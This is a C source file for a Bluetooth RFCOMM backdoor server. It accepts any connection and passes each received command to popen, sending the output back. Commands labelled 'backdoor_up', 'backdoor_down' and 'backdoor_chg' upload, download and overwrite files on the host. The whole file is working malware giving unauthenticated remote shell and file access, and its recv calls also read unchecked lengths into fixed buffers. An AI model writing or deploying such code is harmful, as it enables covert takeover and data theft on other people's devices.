#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>

char *nope = "\x00";
char *yeah = "\x01";

char *GetPath(char *cmd)
{
	char *path = strtok(cmd, " ");
	path = strtok(NULL, " ");
	
	return path;
}

int CheckDirPath(int client)
{
	int cmdSize = 0;
	recv(client, (char *)&cmdSize, 4, 0);
	printf("cmdSize: %d\n", cmdSize);

	char cmd[1024] = { 0, };
	char cmd_result[1024] = { 0, };
	recv(client, cmd, cmdSize, 0);

	FILE *command_fp = popen(cmd, "r");
	fread(cmd_result, 1, 1024, command_fp);
	send(client, cmd_result, 1024, 0);
	fclose(command_fp);

	char flag = '\x00';
	recv(client, &flag, 1, 0);

	if (flag == '\x00')
		return 0;
	else
		return 1;
}

int RecvFile(char *cmd, int client)
{
	if (!CheckDirPath(client))			
		return 0;

	char *path = GetPath(cmd);
	FILE *recvFile = fopen(path, "ab");

	char fileData[1024] = { 0, };
	int fileSize;

	while (1)
	{
		memset(fileData, 0, sizeof(fileData));
		fileSize = 0;
		recv(client, (char *)&fileSize, 4, 0);

		if (fileSize == 0)
			break;

		printf("FileSize: %d\n", fileSize);

		recv(client, fileData, fileSize, 0);
		printf("Size: %s\n", (char *)&fileSize);
		printf("Data: %s\n", fileData);
		fwrite(fileData, 1, fileSize, recvFile);
	}

	fclose(recvFile);

	return 1;
}

int SendFile(char *cmd, int client)
{
	if (!CheckDirPath(client))
		return 0;

	char *path = GetPath(cmd);
	FILE *sendFile = fopen(path, "rb");

	char fileData;

	while (1)
	{
		fileData = fgetc(sendFile);

		if (feof(sendFile))
		{
			printf("EOF\n");
			send(client, "\x00", 1, 0);
			break;
		}

		send(client, "\x01", 1, 0);
		send(client, &fileData, 1, 0);
	}

	fclose(sendFile);

	return 1;
}

int main()
{
	struct sockaddr_rc loc_addr = { 0 };
	struct sockaddr_rc rem_addr = { 0 };
	char cmd[1024] = { 0 };
	char cmd_result[1024] = { 0 };
	int cmd_length;
	FILE *command_fp;


	unsigned int opt = sizeof(rem_addr);
	int s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);

	loc_addr.rc_family = AF_BLUETOOTH;
	loc_addr.rc_bdaddr = *BDADDR_ANY;
	loc_addr.rc_channel = 1;

	bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));

	listen(s, 1);

	int client = accept(s, (struct sockaddr *)&rem_addr, &opt);
	ba2str(&rem_addr.rc_bdaddr, cmd);
	fprintf(stderr, "accepted connection from %s\n", cmd);

	while (1)
	{
		memset(cmd, 0, sizeof(cmd));
		memset(cmd_result, 0, sizeof(cmd_result));

		if (recv(client, cmd, sizeof(cmd), 0) > 0)
		{
			if (strncmp(cmd, "[EXIT]", 6) == 0)
				break;
			else if (strncmp(cmd, "backdoor_chg", 12) == 0)
			{
				if (!SendFile(cmd, client))
					continue;
				if (!RecvFile(cmd, client))
					continue;

				continue;
			}
			else if (strncmp(cmd, "backdoor_up", 11) == 0)
			{
				RecvFile(cmd, client);
				continue;
			}
			else if (strncmp(cmd, "backdoor_down", 13) == 0)
			{
				SendFile(cmd, client);
				continue;
			}

			command_fp = popen(cmd, "r");
			cmd_length = fread(cmd_result, 1, 1024, command_fp);
			send(client, cmd_result, 1024, 0);
			fclose(command_fp);
		}
	}

	close(client);
	close(s);

	return 0;
}
